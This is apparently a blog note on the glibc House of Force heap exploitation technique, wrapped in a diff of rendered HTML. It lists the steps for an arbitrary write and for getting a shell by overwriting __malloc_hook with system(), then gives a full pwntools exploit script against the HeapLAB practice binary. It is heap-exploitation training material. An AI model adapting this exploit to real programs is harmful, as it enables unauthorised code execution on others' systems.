@@ -1,0 +1,98 @@
+I"ÿ*<h2 id="requirements">Requirements</h2>
+<ul>
+  <li>Control size of top chunk, usually through heap overflow</li>
+  <li>Freely control malloc size</li>
+</ul>
+
+<h2 id="process">Process</h2>
+<h3 id="arbitrary-write-primitive">Arbitrary Write Primitive</h3>
+<ul>
+  <li>Overwrite size of top chunk to <code class="highlighter-rouge">0xffffffffffffffff</code></li>
+  <li>Allocate chunk with size of <code class="highlighter-rouge">offset</code>, using <code class="highlighter-rouge">malloc()</code>
+    <ul>
+      <li>If <code class="highlighter-rouge">target &lt; top_chunk</code>: <code class="highlighter-rouge">offset = top_chunk - target + allocated_chunks_size</code></li>
+      <li>If <code class="highlighter-rouge">target &gt; top_chunk</code>: <code class="highlighter-rouge">offset = target - top_chunk - allocated_chunks_size</code></li>
+    </ul>
+  </li>
+  <li>Allocate new chunk, this chunk will be created at <code class="highlighter-rouge">target</code></li>
+</ul>
+
+<h3 id="gaining-rce-using-ret2libc">Gaining RCE using ret2libc</h3>
+<p><em>This requires libc version to be known</em></p>
+<ul>
+  <li>Overwrite <code class="highlighter-rouge">__malloc_hook</code> using write primitive with <code class="highlighter-rouge">system()</code></li>
+  <li>Call <code class="highlighter-rouge">malloc(/bin/sh)</code></li>
+</ul>
+
+<h2 id="example-heaplab-house-of-force">Example: HeapLAB House of Force</h2>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./house_of_force"</span><span class="p">,</span>
+    <span class="s">"libc"</span> <span class="p">:</span> <span class="s">"./libc-2.28.so"</span><span class="p">,</span>
+    <span class="s">"ld"</span> <span class="p">:</span> <span class="s">"./ld.so.2"</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'size:'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'data:'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+    <span class="c1"># Get addresses
+</span>    <span class="n">ru</span><span class="p">(</span><span class="s">'puts() @ '</span><span class="p">)</span>
+    <span class="n">puts</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">ru</span><span class="p">(</span><span class="s">'heap @ '</span><span class="p">)</span>
+    <span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+    
+    <span class="c1"># Calculate libc_base, etc...
+</span>    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+    <span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
+    <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+    <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="si">\</span><span class="se">x00</span><span class="s">'</span><span class="p">).</span><span class="nb">next</span><span class="p">()</span>
+
+    <span class="n">lg</span><span class="p">(</span><span class="s">'heap_addr: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>
+    <span class="n">lg</span><span class="p">(</span><span class="s">'malloc_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
+    <span class="n">lg</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+    <span class="n">lg</span><span class="p">(</span><span class="s">'binsh: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>
+    
+    <span class="c1"># House of Force: Overwrite top_chunk size
+</span>    <span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s">'/bin/sh</span><span class="si">\</span><span class="se">x00</span><span class="s">'</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s">"</span><span class="si">\</span><span class="se">x00</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>
+    
+    <span class="s">"""
+    # Overwrite target with "OVERWRIT"
+    target = elf.symbols['target']
+    top_chunk = heap_addr + 0x20
+    offset = top_chunk - target + 32
+    ru('&gt;')
+    malloc(-offset, p64(0xdeadbeef))
+    malloc(16, 'OVERWRIT')
+    sla('&gt;', '2')
+    """</span>
+
+    <span class="c1"># Pop shell with ret2libc by overwriting __malloc_hook with system() 
+</span>    <span class="n">top_chunk</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x20</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="n">top_chunk</span> <span class="o">-</span> <span class="mi">32</span>
+    <span class="n">ru</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">)</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="s">"Y"</span><span class="p">)</span> 
+    <span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'size:'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>
+
+    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">])</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">config</span><span class="p">[</span><span class="s">"ld"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">]],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]})</span>
+    <span class="n">pause</span><span class="p">()</span>
+
+    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</code></pre></div></div>
+:ET
